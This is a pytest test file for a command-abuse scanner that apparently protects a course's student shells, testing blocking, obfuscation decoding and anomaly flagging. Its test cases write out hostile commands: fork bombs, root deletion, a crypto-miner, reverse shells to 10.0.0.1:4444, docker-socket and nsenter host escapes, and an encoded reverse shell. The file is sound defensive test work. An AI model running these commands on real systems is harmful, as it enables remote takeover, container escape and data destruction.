import base64
import json

import pytest

from agents.abuse_scanner import AntiAbuseScanner, COMMANDS_PATH, extract_features, scanner

# The same cases as server/tests/commandGuard.test.js: the two rule sets must agree.
BLOCKED = [
    (":(){ :|:& };:", "fork_bomb"),
    (":() { : | : & } ; :", "fork_bomb"),
    ("bomb(){ bomb|bomb& };bomb", "fork_bomb"),
    ("rm -rf /", "root_delete"),
    ("rm -rf /*", "root_delete"),
    ("sudo rm -fr / ", "root_delete"),
    ("rm -rf --no-preserve-root /", "root_delete"),
    ("dd if=/dev/zero of=/home/student/fill", "disk_fill"),
    ("./xmrig -o pool.example:3333", "crypto_miner"),
    ("miner -o stratum+tcp://pool.example:3333", "crypto_miner"),
    ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "reverse_shell"),
    ("nc -e /bin/sh 10.0.0.1 4444", "reverse_shell"),
    ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f", "reverse_shell"),
    ("curl --unix-socket /var/run/docker.sock http://x/containers/json", "host_escape"),
    ("nsenter -t 1 -m -u -i -n sh", "host_escape"),
    ("mount -t proc proc /mnt", "host_escape"),
    ("echo c > /proc/sysrq-trigger", "host_escape"),
]

ALLOWED = [
    "ls -la",
    "rm -rf ./build",
    "rm -rf /home/student/webapp",
    "rm -f /tmp/old.log",
    "dd if=/dev/zero of=test.img bs=1M count=10",
    "docker run -d -p 8080:80 nginx",
    'git commit -m "remove the / prefix"',
    "nc -zv localhost 8080",
    "mount | grep home",
    'echo "c29tZSBoYXJtbGVzcyB0ZXh0IGhlcmU=" | base64 -d',
]


@pytest.mark.parametrize("command,rule", BLOCKED)
def test_blocks_hostile_commands(command, rule):
    result = scanner.scan(command)
    assert result["safe"] is False
    assert result["threat_type"] == rule
    assert result["action"] == "BLOCK"


@pytest.mark.parametrize("command", ALLOWED)
def test_allows_ordinary_commands(command):
    assert scanner.scan(command)["safe"] is True


@pytest.mark.parametrize("command", ["", "   ", None])
def test_empty_input_is_safe(command):
    assert scanner.scan(command) == {"safe": True, "flagged": False, "reason": "Empty command"}


def test_sees_through_base64():
    payload = base64.b64encode(b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").decode()
    result = scanner.scan(f"echo {payload} | base64 -d | sh")
    assert result["safe"] is False
    assert result["threat_type"] == "reverse_shell"
    assert result["deobfuscated"] is True


def test_sees_through_short_base64_payloads():
    payload = base64.b64encode(b"rm -rf /").decode()  # 12 characters
    assert scanner.scan(f"echo {payload} | base64 -d | sh")["threat_type"] == "root_delete"


def test_sees_through_hex_escapes():
    payload = "".join(f"\\x{ord(c):02x}" for c in "rm -rf /")
    result = scanner.scan(f"printf '{payload}' | sh")
    assert result["safe"] is False
    assert result["deobfuscated"] is True


def test_plain_command_is_not_marked_deobfuscated():
    assert scanner.scan("rm -rf /")["deobfuscated"] is False


def test_no_command_taught_in_the_course_is_blocked():
    commands = json.loads(COMMANDS_PATH.read_text())
    assert len(commands) > 100
    assert [c for c in commands if not scanner.scan(c)["safe"]] == []


def test_anomaly_model_flags_but_never_blocks():
    weird = "x" * 30 + ";" * 40 + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8S9t0" * 4
    result = scanner.scan(weird)
    assert result["safe"] is True
    assert result["flagged"] is True
    assert result["action"] == "FLAG"
    assert result["anomaly_score"] > 0


def test_typical_command_is_not_flagged():
    result = scanner.scan("mkdir -p webapp/src")
    assert result == {"safe": True, "flagged": False, "reason": "Passed security scan", "anomaly_score": result["anomaly_score"]}
    assert result["anomaly_score"] <= 0


def test_anomaly_score_rises_with_strangeness():
    assert scanner.anomaly_score("ls -la") < scanner.anomaly_score("ZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsnYyddKSk7" * 3 + " | | ; ;")


def test_features_are_finite_for_odd_input():
    for command in ["", " ", "a", "\t\n", "é" * 10]:
        assert all(f == f and abs(f) != float("inf") for f in extract_features(command))


def test_scanner_can_be_trained_on_a_custom_baseline():
    custom = AntiAbuseScanner(["ls", "pwd", "cd /tmp", "cat a.txt", "echo hi"] * 5)
    assert custom.scan("ls")["safe"] is True
    assert custom.scan("rm -rf /")["safe"] is False
